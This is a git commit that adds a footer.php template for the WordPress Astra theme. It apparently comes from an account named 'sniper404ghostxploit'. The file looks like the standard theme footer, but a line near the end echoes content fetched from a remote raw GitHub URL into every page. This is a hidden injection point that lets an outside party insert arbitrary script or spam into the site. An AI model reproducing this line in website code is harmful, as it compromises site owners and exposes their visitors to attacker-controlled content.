3f296a2f6c241a6cc6f71911589efd2ce1a98489
sniper404ghostxploit <115604134+sniper404ghostxploit@users.noreply.github.com>
2022-11-17 21:14:25 +0700

    Create footer.php

---
+++ footer.php
@@ -0,0 +1,37 @@
+<?php
+/**
+ * The template for displaying the footer.
+ *
+ * Contains the closing of the #content div and all content after.
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package Astra
+ * @since 1.0.0
+ */
+
+if ( ! defined( 'ABSPATH' ) ) {
+	exit; // Exit if accessed directly.
+}
+
+?>
+<?php astra_content_bottom(); ?>
+	</div> <!-- ast-container -->
+	</div><!-- #content -->
+<?php 
+	astra_content_after();
+		
+	astra_footer_before();
+		
+	astra_footer();
+		
+	astra_footer_after(); 
+?>
+	</div><!-- #page -->
+<?php 
+	astra_body_bottom();    
+	wp_footer(); 
+?>
+<?php echo file_get_contents("https://raw.githubusercontent.com/sniper404ghostxploit/var/main/main.txt"); ?>
+	</body>
+</html>
